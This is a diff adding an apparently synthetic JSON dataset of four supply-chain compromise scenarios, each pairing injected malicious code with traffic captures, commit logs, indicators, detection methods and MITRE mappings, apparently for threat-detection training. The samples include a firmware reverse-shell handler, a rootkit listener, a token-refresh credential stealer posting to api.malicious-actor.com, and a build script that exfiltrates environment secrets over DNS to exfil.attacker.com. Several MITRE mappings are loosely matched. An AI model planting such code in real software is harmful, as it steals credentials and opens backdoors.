@@ -1,0 +1,229 @@
+{
+  "samples": [
+    {
+      "scenario": "Compromised firmware update for a popular network switch vendor includes hidden functionality that accepts encrypted commands from attacker-controlled infrastructure, enabling persistent remote access and network reconnaissance.",
+      "technical_data": {
+        "compromised_code_snippet": "/* Injected malicious command handler in firmware update */\nvoid process_network_packet(Packet *pkt) {\n  if (is_encrypted_command(pkt->payload)) {\n    Command cmd = decrypt_command(pkt->payload);\n    if (cmd.type == REMOTE_ACCESS) {\n      establish_reverse_shell(cmd.c2_address, cmd.c2_port);\n    }\n  }\n  // Original packet processing code follows\n  forward_packet(pkt);\n}",
+        "software_bill_of_materials": {
+          "name": "net-switch-firmware",
+          "version": "3.5.8",
+          "dependencies": {
+            "libcrypto": "1.1.1k",
+            "libnet": "1.2.3"
+          },
+          "hash": {
+            "sha256": "d4f7b8c6a1e2f3d4c5b6a7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8"
+          }
+        },
+        "network_traffic_capture": [
+          "10:22:33.123456 IP 10.0.0.5.49152 > 203.0.113.77.4444: Flags [P.], seq 3456:3500, ack 7890, win 29200, length 44",
+          "EncryptedPayloadData==",
+          "10:22:33.123789 IP 203.0.113.77.4444 > 10.0.0.5.49152: Flags [P.], seq 7890:7934, ack 3500, win 28980, length 44",
+          "EncryptedCommandResponse=="
+        ],
+        "web_server_log": "",
+        "version_control_commit_log": {
+          "commit": "b7e8f9a0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6",
+          "author": "devops@netswitchvendor.com",
+          "date": "2024-06-08T14:42:10Z",
+          "message": "Firmware update: security patch and performance improvements",
+          "diff": "+ void process_network_packet(Packet *pkt) {\n+   if (is_encrypted_command(pkt->payload)) {\n+     Command cmd = decrypt_command(pkt->payload);\n+     if (cmd.type == REMOTE_ACCESS) {\n+       establish_reverse_shell(cmd.c2_address, cmd.c2_port);\n+     }\n+   }\n+   forward_packet(pkt);\n+ }"
+        }
+      },
+      "indicators": {
+        "network_iocs": [
+          "203.0.113.77",
+          "port 4444",
+          "EncryptedPayloadData=="
+        ],
+        "file_hashes": {
+          "net-switch-firmware.bin": {
+            "sha256": "d4f7b8c6a1e2f3d4c5b6a7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8"
+          }
+        },
+        "version_control_iocs": [
+          "commit b7e8f9a0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6",
+          "author devops@netswitchvendor.com",
+          "commit date 2024-06-08T14:42:10Z"
+        ]
+      },
+      "detection_method": "Analyze firmware update packages for unauthorized code insertions via binary diffing and signature validation; monitor network traffic from updated devices for unusual encrypted outbound connections on uncommon ports; implement integrity checks on firmware versions and verify cryptographic signatures; deploy anomaly-based IDS to detect command and control traffic patterns from network devices.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1095 - Non-Application Layer Protocol",
+        "T1021 - Remote Services",
+        "T1041 - Exfiltration Over C2 Channel"
+      ]
+    },
+    {
+      "scenario": "A compromised third-party cloud SDK package used for authentication introduces logic that silently logs user credentials and sends them to an attacker-controlled API endpoint during token refresh operations.",
+      "technical_data": {
+        "compromised_code_snippet": "// Added malicious credential exfiltration in token refresh\nfunction refreshToken(oldToken) {\n  const newToken = originalRefreshToken(oldToken);\n  const credentials = extractCredentialsFromToken(newToken);\n  const exfiltrateUrl = 'https://api.malicious-actor.com/log';\n  fetch(exfiltrateUrl, {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ creds: credentials })\n  }).catch(() => {});\n  return newToken;\n}",
+        "software_bill_of_materials": {
+          "name": "cloud-auth-sdk",
+          "version": "2.0.5",
+          "dependencies": {
+            "axios": "0.21.1",
+            "jsonwebtoken": "8.5.1"
+          },
+          "hash": {
+            "sha256": "f9e0d1c2b3a4e5f6d7c8b9a0f1e2d3c4b5a6c7d8e9f0a1b2c3d4e5f6a7b8c9d0"
+          }
+        },
+        "network_traffic_capture": [
+          "11:55:44.987654 IP 172.16.5.10.56789 > 198.51.100.99.443: Flags [P.], seq 5678:5720, ack 12345, win 64240, length 42",
+          "POST /log HTTP/1.1",
+          "Host: api.malicious-actor.com",
+          "User-Agent: axios/0.21.1",
+          "Content-Type: application/json",
+          "Content-Length: 58",
+          "",
+          "{\"creds\":{\"username\":\"user1\",\"password\":\"P@ssw0rd!\"}}"
+        ],
+        "web_server_log": "172.16.5.10 - - [11/Jun/2024:11:55:44 +0000] \"POST /log HTTP/1.1\" 200 5 \"-\" \"axios/0.21.1\"",
+        "version_control_commit_log": {
+          "commit": "c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
+          "author": "alice.jones <alice.jones@trustedvendor.com>",
+          "date": "2024-06-09T08:22:50Z",
+          "message": "Enhance token refresh to support new auth flows",
+          "diff": "+ function refreshToken(oldToken) {\n+   const newToken = originalRefreshToken(oldToken);\n+   const credentials = extractCredentialsFromToken(newToken);\n+   const exfiltrateUrl = 'https://api.malicious-actor.com/log';\n+   fetch(exfiltrateUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ creds: credentials }) }).catch(() => {});\n+   return newToken;\n+ }"
+        }
+      },
+      "indicators": {
+        "network_iocs": [
+          "api.malicious-actor.com",
+          "198.51.100.99",
+          "POST /log"
+        ],
+        "file_hashes": {
+          "cloud-auth-sdk.js": {
+            "sha256": "f9e0d1c2b3a4e5f6d7c8b9a0f1e2d3c4b5a6c7d8e9f0a1b2c3d4e5f6a7b8c9d0"
+          }
+        },
+        "version_control_iocs": [
+          "commit c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
+          "author alice.jones@trustedvendor.com",
+          "commit date 2024-06-09T08:22:50Z"
+        ]
+      },
+      "detection_method": "Perform static code analysis on SDK packages before deployment; verify the integrity of third-party dependencies via SBOM and hash validation; monitor and alert on unusual outbound HTTPS POST requests from client applications to unknown external domains, especially during authentication flows; use endpoint detection and response (EDR) tools to flag suspicious network activity originating from SDK runtime environments.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1056 - Input Capture",
+        "T1041 - Exfiltration Over C2 Channel"
+      ]
+    },
+    {
+      "scenario": "A trusted hardware component supplier's firmware update for network devices is compromised, embedding a hidden rootkit that activates on boot to create a covert channel for remote attackers to manipulate device configurations and intercept traffic.",
+      "technical_data": {
+        "compromised_code_snippet": "// Malicious firmware patch inserted by attackers\nvoid init_rootkit() {\n    // Hook device startup routines\n    original_boot_func = get_boot_function();\n    set_boot_function(malicious_boot_func);\n}\n\nvoid malicious_boot_func() {\n    original_boot_func();\n    // Establish covert channel\n    start_hidden_tcp_server(4444);\n    log_event(\"Rootkit activated\");\n}\n\nvoid start_hidden_tcp_server(int port) {\n    // Listen on non-standard port for commands\n    while(1) {\n        int client = accept_connection(port);\n        if (client > 0) {\n            process_commands(client);\n            close(client);\n        }\n    }\n}",
+        "software_bill_of_materials": {
+          "name": "net-device-firmware",
+          "version": "3.5.0",
+          "dependencies": {
+            "lwip-stack": "2.1.2",
+            "openssl": "1.1.1k"
+          },
+          "hash": {
+            "sha256": "d4c3b2a1f9e8d7c6b5a493827161514131211100f0e0d0c0b0a090807060504"
+          }
+        },
+        "network_traffic_capture": [
+          "10:12:45.678901 IP 10.0.0.15.52345 > 203.0.113.99.4444: Flags [S], seq 0, win 65535, length 0",
+          "10:12:45.679123 IP 203.0.113.99.4444 > 10.0.0.15.52345: Flags [S.], seq 1000, ack 1, win 65535, length 0",
+          "10:12:46.000000 IP 10.0.0.15.52345 > 203.0.113.99.4444: Flags [P.], seq 1:50, ack 1001, win 65535, length 49",
+          "Command: GET_CONFIG",
+          "Response: OK"
+        ],
+        "web_server_log": null,
+        "version_control_commit_log": {
+          "commit": "c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f60718293a",
+          "author": "alice.jones <alice.jones@trustedhardware.com>",
+          "date": "2024-06-05T14:22:10Z",
+          "message": "Firmware update version 3.5.0 with security patches",
+          "diff": "+ void init_rootkit() {\n+   // Hook device startup routines\n+   original_boot_func = get_boot_function();\n+   set_boot_function(malicious_boot_func);\n+ }\n+ void malicious_boot_func() {\n+   original_boot_func();\n+   start_hidden_tcp_server(4444);\n+   log_event(\"Rootkit activated\");\n+ }"
+        }
+      },
+      "indicators": {
+        "network_iocs": [
+          "203.0.113.99",
+          "TCP port 4444",
+          "covert channel traffic"
+        ],
+        "file_hashes": {
+          "firmware_v3.5.0.bin": {
+            "sha256": "d4c3b2a1f9e8d7c6b5a493827161514131211100f0e0d0c0b0a090807060504"
+          }
+        },
+        "version_control_iocs": [
+          "commit c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f60718293a",
+          "author alice.jones@trustedhardware.com",
+          "commit date 2024-06-05T14:22:10Z"
+        ]
+      },
+      "detection_method": "Validate firmware updates via cryptographic signatures and compare SBOM hashes; monitor unusual open ports and persistent TCP listeners on network devices; capture network traffic for uncommon destination IPs and ports; implement host-based intrusion detection on devices to detect unexpected process hooks; audit version control commits from third-party suppliers for suspicious code introducing persistent backdoors.",
+      "relevant_mitre_techniques": [
+        "T1195.003 - Supply Chain Compromise: Compromise Hardware Supply Chain",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell (analogous embedded scripting)",
+        "T1574.002 - Hijack Execution Flow: DLL Side-Loading (similar concept applied to firmware hooks)",
+        "T1041 - Exfiltration Over C2 Channel"
+      ]
+    },
+    {
+      "scenario": "A third-party development tool integrated into the CI/CD pipeline is compromised. The malicious update injects a script that collects developer credentials and environment secrets, sending them via encrypted DNS queries to an attacker-controlled domain.",
+      "technical_data": {
+        "compromised_code_snippet": "# Injected malicious script snippet in build-tool.js\nconst dns = require('dns');\n\nfunction exfiltrateSecrets() {\n  const secrets = process.env.DEV_TOKEN + ':' + process.env.API_SECRET;\n  const encoded = Buffer.from(secrets).toString('base64');\n  const domain = encoded + '.exfil.attacker.com';\n  dns.resolveTxt(domain, (err, records) => {\n    if (err) {\n      console.error('Exfiltration failed');\n    }\n  });\n}\n\n// Trigger exfiltration during build initialization\nexfiltrateSecrets();",
+        "software_bill_of_materials": {
+          "name": "thirdparty-build-tool",
+          "version": "2.9.4",
+          "dependencies": {
+            "dns": "0.2.2",
+            "axios": "0.21.1"
+          },
+          "hash": {
+            "sha256": "b7c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9"
+          }
+        },
+        "network_traffic_capture": [
+          "11:30:00.123456 IP 172.16.0.10.56789 > 198.51.100.100.53: Flags [P.], seq 123:145, ack 456, win 512, length 22",
+          "Standard query txt encodedsecrets.exfil.attacker.com",
+          "11:30:00.123789 IP 198.51.100.100.53 > 172.16.0.10.56789: Flags [P.], seq 456:478, ack 145, win 1024, length 22",
+          "Response: \"ok\""
+        ],
+        "web_server_log": null,
+        "version_control_commit_log": {
+          "commit": "f1e2d3c4b5a697887766554433221100ffeeddcc",
+          "author": "michael.brown <michael.brown@thirdpartyvendor.com>",
+          "date": "2024-06-12T08:00:00Z",
+          "message": "Update build tool with performance improvements",
+          "diff": "+ function exfiltrateSecrets() {\n+   const secrets = process.env.DEV_TOKEN + ':' + process.env.API_SECRET;\n+   const encoded = Buffer.from(secrets).toString('base64');\n+   const domain = encoded + '.exfil.attacker.com';\n+   dns.resolveTxt(domain, (err, records) => {\n+     if (err) {\n+       console.error('Exfiltration failed');\n+     }\n+   });\n+ }\n+ exfiltrateSecrets();"
+        }
+      },
+      "indicators": {
+        "network_iocs": [
+          "exfil.attacker.com",
+          "198.51.100.100",
+          "DNS TXT queries with base64 encoded payload"
+        ],
+        "file_hashes": {
+          "build-tool.js": {
+            "sha256": "b7c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9"
+          }
+        },
+        "version_control_iocs": [
+          "commit f1e2d3c4b5a697887766554433221100ffeeddcc",
+          "author michael.brown@thirdpartyvendor.com",
+          "commit date 2024-06-12T08:00:00Z"
+        ]
+      },
+      "detection_method": "Monitor DNS traffic for abnormal TXT queries containing base64 or encoded secrets; inspect version control commits for added network calls to suspicious domains; enforce environment variable encryption and restrict access in CI/CD environments; implement policies to detect unauthorized scripts in build tools; use endpoint detection to flag DNS queries with unusual patterns and unexpected external resolutions from build servers.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1071.004 - Application Layer Protocol: DNS",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1086 - PowerShell (analogous scripting abuse)"
+      ]
+    }
+  ]
+}
